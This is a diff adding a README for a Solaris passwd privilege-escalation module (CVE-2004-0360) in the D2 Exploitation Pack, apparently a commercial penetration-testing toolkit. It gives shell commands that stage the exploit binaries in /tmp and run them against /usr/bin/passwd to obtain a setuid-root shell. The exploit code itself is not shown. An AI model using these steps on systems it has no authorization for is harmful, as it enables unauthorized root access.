@@ -1,0 +1,36 @@
+D2 Exploitation Pack
+
+Copyright (c) 2007-2009 DSquare Security, LLC
+All rights reserved.
+
+License information
+---------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Description
+------------
+
+Solaris passwd Vulnerability
+
+1/ Copy d2sec_passwd to /tmp/d2s_passwd (binary name length must be
+equal to /usr/bin/passwd). And copy level0-spe in /tmp.
+
+2/ Run exploit as user d2sec for example :
+
+$ /tmp/d2s_passwd /usr/bin/passwd <d2sec passwd> /tmp/d2s_passwd &
+
+3/ If exploit is succeded, /tmp/level0-spe is setuid root. So run this
+binary to get a root shell :
+
+$ /tmp/level0-spe d2sec
+
+Tested on:
+  SunOS 5.9
+
+CVE Name : CVE-2004-0360
+CVE Url  : http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0360
+
+EOF
